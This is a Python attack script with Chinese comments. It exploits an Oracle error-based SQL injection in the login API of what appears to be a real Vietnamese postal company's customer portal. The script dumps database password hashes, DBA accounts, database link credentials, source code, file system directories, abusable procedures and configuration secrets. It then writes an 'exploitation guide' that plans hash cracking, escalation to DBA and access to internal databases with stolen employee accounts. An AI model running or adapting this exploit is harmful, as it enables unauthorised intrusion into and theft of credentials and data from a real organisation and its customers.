#!/usr/bin/env python3
"""
终极权限提升 - 深度挖掘所有敏感信息
"""
import requests, urllib3, json
urllib3.disable_warnings()

url = 'https://customerconnect.ems.com.vn/api/User_Customer/Login'

def sqli(q):
    p = {'Username': f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({q})))||'", 'Password': 'test'}
    try:
        r = requests.post(url, json=p, verify=False, timeout=25)
        if 'thesaurus' in r.text:
            s = r.text.find('thesaurus ') + 10
            e = r.text.find(' does not', s)
            if e > s: return r.text[s:e]
    except: pass
    return None

print("=" * 90)
print("🔥 终极深挖：所有敏感信息和提权路径")
print("=" * 90)

all_findings = {}

# 1. 数据库用户密码（最关键）
print("\n[1] 所有数据库用户密码哈希:\n")
db_users = []

for i in range(1, 30):
    user = sqli(f"SELECT NAME FROM (SELECT NAME, ROWNUM AS RN FROM SYS.USER$) WHERE RN={i}")
    if user:
        # 获取密码哈希
        pwd_hash = sqli(f"SELECT PASSWORD FROM SYS.USER$ WHERE NAME='{user}'")
        spare4 = sqli(f"SELECT SPARE4 FROM SYS.USER$ WHERE NAME='{user}'")
        
        db_users.append({
            'username': user,
            'password_hash': pwd_hash,
            'spare4': spare4
        })
        
        print(f"  {i:2d}. {user:20s} | HASH: {pwd_hash} | SPARE4: {spare4}")

all_findings['db_users'] = db_users

# 2. DBA权限用户
print("\n[2] DBA权限用户:\n")
dba_users = []

for i in range(1, 10):
    user = sqli(f"SELECT GRANTEE FROM (SELECT GRANTEE, ROWNUM AS RN FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA') WHERE RN={i}")
    if user:
        dba_users.append(user)
        print(f"  {i}. {user}")

all_findings['dba_users'] = dba_users

# 3. Java源码（可能有密码/密钥）
print("\n[3] Java存储过程源码（查找硬编码密码）:\n")

for i in range(1, 6):
    java_name = sqli(f"SELECT NAME FROM (SELECT NAME, ROWNUM AS RN FROM ALL_JAVA_SOURCES WHERE OWNER='EMS') WHERE RN={i}")
    
    if java_name:
        print(f"  {i}. {java_name}")
        
        # 获取源码片段
        source = sqli(f"SELECT TEXT FROM ALL_JAVA_SOURCES WHERE NAME='{java_name}' AND OWNER='EMS' AND ROWNUM=1")
        
        if source and any(k in source.upper() for k in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN']):
            print(f"     🔑 包含敏感信息: {source[:150]}...")

# 4. PL/SQL包体源码
print("\n[4] PL/SQL包源码（查找加密/解密逻辑）:\n")

for i in range(1, 6):
    pkg = sqli(f"SELECT NAME FROM (SELECT NAME, ROWNUM AS RN FROM ALL_SOURCE WHERE TYPE='PACKAGE BODY' AND OWNER='EMS' AND (NAME LIKE '%CRYPT%' OR NAME LIKE '%SECUR%' OR NAME LIKE '%AUTH%')) WHERE RN={i}")
    
    if pkg:
        print(f"  {i}. {pkg}")
        
        # 获取源码
        src = sqli(f"SELECT TEXT FROM ALL_SOURCE WHERE NAME='{pkg}' AND TYPE='PACKAGE BODY' AND OWNER='EMS' AND ROWNUM=1")
        
        if src:
            print(f"     {src[:200]}...")

# 5. 数据库链接用户密码
print("\n[5] 数据库链接凭证:\n")

for i in range(1, 5):
    link = sqli(f"SELECT DB_LINK FROM (SELECT DB_LINK, ROWNUM AS RN FROM ALL_DB_LINKS) WHERE RN={i}")
    
    if link:
        username = sqli(f"SELECT USERNAME FROM (SELECT USERNAME, ROWNUM AS RN FROM ALL_DB_LINKS) WHERE RN={i}")
        host = sqli(f"SELECT HOST FROM (SELECT HOST, ROWNUM AS RN FROM ALL_DB_LINKS) WHERE RN={i}")
        
        print(f"  {i}. {link}")
        print(f"     User: {username} | Host: {host}")

# 6. 调度任务/作业（可能执行敏感操作）
print("\n[6] 定时任务/作业:\n")

for i in range(1, 6):
    job = sqli(f"SELECT JOB_NAME FROM (SELECT JOB_NAME, ROWNUM AS RN FROM DBA_SCHEDULER_JOBS WHERE OWNER='EMS') WHERE RN={i}")
    
    if job:
        action = sqli(f"SELECT JOB_ACTION FROM DBA_SCHEDULER_JOBS WHERE JOB_NAME='{job}' AND OWNER='EMS'")
        print(f"  {i}. {job}")
        if action:
            print(f"     执行: {action[:150]}...")

# 7. 触发器（可能记录/修改敏感数据）
print("\n[7] 数据库触发器:\n")

for i in range(1, 6):
    trigger = sqli(f"SELECT TRIGGER_NAME FROM (SELECT TRIGGER_NAME, ROWNUM AS RN FROM ALL_TRIGGERS WHERE OWNER='EMS' AND TABLE_NAME='SHIPMENT') WHERE RN={i}")
    
    if trigger:
        trigger_body = sqli(f"SELECT TRIGGER_BODY FROM ALL_TRIGGERS WHERE TRIGGER_NAME='{trigger}' AND OWNER='EMS'")
        print(f"  {i}. {trigger}")
        if trigger_body:
            print(f"     {trigger_body[:200]}...")

# 8. 外部表（可能访问文件系统）
print("\n[8] 外部表（文件系统访问）:\n")

ext_tables = []
for i in range(1, 5):
    ext_table = sqli(f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_EXTERNAL_TABLES WHERE OWNER='EMS') WHERE RN={i}")
    
    if ext_table:
        location = sqli(f"SELECT DEFAULT_DIRECTORY_NAME FROM ALL_EXTERNAL_TABLES WHERE TABLE_NAME='{ext_table}' AND OWNER='EMS'")
        ext_tables.append({'table': ext_table, 'location': location})
        print(f"  {i}. {ext_table} → {location}")

all_findings['external_tables'] = ext_tables

# 9. 目录对象（文件系统路径）
print("\n[9] 目录对象（可读写路径）:\n")

directories = []
for i in range(1, 10):
    dir_name = sqli(f"SELECT DIRECTORY_NAME FROM (SELECT DIRECTORY_NAME, ROWNUM AS RN FROM ALL_DIRECTORIES) WHERE RN={i}")
    
    if dir_name:
        dir_path = sqli(f"SELECT DIRECTORY_PATH FROM (SELECT DIRECTORY_PATH, ROWNUM AS RN FROM ALL_DIRECTORIES) WHERE RN={i}")
        directories.append({'name': dir_name, 'path': dir_path})
        print(f"  {i}. {dir_name:30s} → {dir_path}")

all_findings['directories'] = directories

# 10. 网络ACL（可访问的外部主机）
print("\n[10] 网络ACL（可连接的外部主机）:\n")

for i in range(1, 6):
    acl = sqli(f"SELECT ACL FROM (SELECT ACL, ROWNUM AS RN FROM DBA_NETWORK_ACLS) WHERE RN={i}")
    
    if acl:
        host = sqli(f"SELECT HOST FROM (SELECT HOST, ROWNUM AS RN FROM DBA_NETWORK_ACLS) WHERE RN={i}")
        print(f"  {i}. ACL: {acl} | Host: {host}")

# 11. 系统参数（可能有敏感配置）
print("\n[11] 关键系统参数:\n")

sensitive_params = [
    'REMOTE_LOGIN_PASSWORDFILE',
    'AUDIT_TRAIL', 
    'O7_DICTIONARY_ACCESSIBILITY',
    'SQL92_SECURITY',
    'REMOTE_OS_AUTHENT',
    'UTL_FILE_DIR'
]

for param in sensitive_params:
    val = sqli(f"SELECT VALUE FROM V$PARAMETER WHERE NAME='{param.lower()}'")
    if val:
        print(f"  {param:35s} = {val}")

# 12. 当前会话权限
print("\n[12] 当前用户所有权限:\n")

privileges = []
for i in range(1, 20):
    priv = sqli(f"SELECT PRIVILEGE FROM (SELECT PRIVILEGE, ROWNUM AS RN FROM USER_SYS_PRIVS) WHERE RN={i}")
    if priv:
        privileges.append(priv)
        print(f"  {i}. {priv}")

all_findings['current_privileges'] = privileges

# 13. 可注入的存储过程（提权利用）
print("\n[13] 可利用的存储过程:\n")

dangerous_procs = [
    'UTL_FILE',
    'DBMS_JAVA',
    'DBMS_SCHEDULER',
    'DBMS_XMLGEN',
    'UTL_HTTP',
    'UTL_SMTP',
    'DBMS_LDAP'
]

exploitable = []
for proc in dangerous_procs:
    can_exec = sqli(f"SELECT COUNT(*) FROM ALL_TAB_PRIVS WHERE TABLE_NAME='{proc}' AND PRIVILEGE='EXECUTE'")
    
    if can_exec and can_exec != '0':
        exploitable.append(proc)
        print(f"  ✓ {proc} - 可执行!")

all_findings['exploitable_procedures'] = exploitable

# 14. Web应用配置（连接字符串等）
print("\n[14] Web应用配置表:\n")

web_configs = []
config_tables = ['WEB_CONFIG', 'APP_CONFIG', 'APPLICATION_SETTINGS', 'SYSTEM_SETTINGS']

for table in config_tables:
    exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE TABLE_NAME='{table}' AND OWNER='EMS'")
    
    if exists == '1':
        print(f"  ✓ EMS.{table}")
        
        for i in range(1, 6):
            key = sqli(f"SELECT CONFIG_KEY FROM (SELECT CONFIG_KEY, ROWNUM AS RN FROM EMS.{table}) WHERE RN={i}")
            if not key:
                key = sqli(f"SELECT KEY FROM (SELECT KEY, ROWNUM AS RN FROM EMS.{table}) WHERE RN={i}")
            
            if key:
                val = sqli(f"SELECT CONFIG_VALUE FROM (SELECT CONFIG_VALUE, ROWNUM AS RN FROM EMS.{table}) WHERE RN={i}")
                if not val:
                    val = sqli(f"SELECT VALUE FROM (SELECT VALUE, ROWNUM AS RN FROM EMS.{table}) WHERE RN={i}")
                
                if val and any(k in key.upper() for k in ['PASS', 'KEY', 'SECRET', 'TOKEN', 'CONNECTION']):
                    web_configs.append({'key': key, 'value': val})
                    print(f"     🔑 {key}: {val}")

all_findings['web_configs'] = web_configs

# 15. 其他Schema的高价值表
print("\n[15] 其他Schema的敏感表:\n")

other_schemas = []
for i in range(1, 143):
    schema = sqli(f"SELECT USERNAME FROM (SELECT USERNAME, ROWNUM AS RN FROM ALL_USERS) WHERE RN={i}")
    
    if schema and schema not in ['SYS', 'SYSTEM', 'EMS', 'BCCPCOM', 'CTXSYS', 'XDB']:
        # 检查是否有USER/ADMIN/PASSWORD表
        has_user_table = sqli(f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{schema}' AND (TABLE_NAME LIKE '%USER%' OR TABLE_NAME LIKE '%ADMIN%' OR TABLE_NAME LIKE '%PASSWORD%') AND ROWNUM=1")
        
        if has_user_table:
            other_schemas.append({'schema': schema, 'table': has_user_table})
            print(f"  ✓ {schema}.{has_user_table}")

all_findings['other_schemas'] = other_schemas

# 保存所有结果
print("\n" + "=" * 90)
print("💾 保存结果...")
print("=" * 90)

with open('ultimate_findings.json', 'w') as f:
    json.dump(all_findings, f, indent=2)

with open('EXPLOITATION_GUIDE.md', 'w') as f:
    f.write("# 🔥 EMS系统完整渗透报告\n\n")
    f.write("## 📊 发现汇总\n\n")
    f.write(f"- **数据库用户**: {len(db_users)} 个（含密码哈希）\n")
    f.write(f"- **DBA权限用户**: {len(dba_users)} 个\n")
    f.write(f"- **当前权限**: {len(privileges)} 个\n")
    f.write(f"- **可利用存储过程**: {len(exploitable)} 个\n")
    f.write(f"- **文件系统目录**: {len(directories)} 个\n")
    f.write(f"- **外部表**: {len(ext_tables)} 个\n\n")
    
    f.write("## 🎯 提权路径\n\n")
    
    if 'EXECUTE' in ' '.join(privileges):
        f.write("### ✅ 可执行存储过程提权\n\n")
        for proc in exploitable:
            f.write(f"- `{proc}` - 可用于代码执行/文件操作\n")
    
    if directories:
        f.write("\n### ✅ 文件系统访问\n\n")
        for d in directories[:5]:
            f.write(f"- `{d['name']}`: {d['path']}\n")
    
    f.write("\n## 🔑 获取的凭证\n\n")
    f.write("### 数据库用户（前10个）\n\n")
    for user in db_users[:10]:
        f.write(f"- **{user['username']}**: {user['password_hash']}\n")
    
    f.write("\n### 员工账号（见 sensitive_data.json）\n\n")
    f.write("- 10个员工账号 + MD5密码\n")
    f.write("- 5个Zalo Token\n")
    f.write("- 2个内网数据库连接\n")
    
    f.write("\n## 💡 后续行动\n\n")
    f.write("1. 破解数据库用户密码哈希\n")
    f.write("2. 利用可执行存储过程提权到DBA\n")
    f.write("3. 通过文件系统读取配置文件\n")
    f.write("4. 访问内网数据库获取完整数据\n")
    f.write("5. 利用员工账号登录Web后台\n")

print(f"\n✅ 完整结果已保存:")
print(f"   - ultimate_findings.json (详细数据)")
print(f"   - EXPLOITATION_GUIDE.md (利用指南)")
print(f"   - sensitive_data.json (之前的敏感信息)")

print("\n" + "=" * 90)
print("🎯 关键发现:")
print("=" * 90)
print(f"  📦 数据库用户: {len(db_users)}")
print(f"  👑 DBA用户: {len(dba_users)}")
print(f"  🔧 可利用程序: {len(exploitable)}")
print(f"  📁 文件系统路径: {len(directories)}")
print(f"  🌐 其他敏感Schema: {len(other_schemas)}")
print("=" * 90)
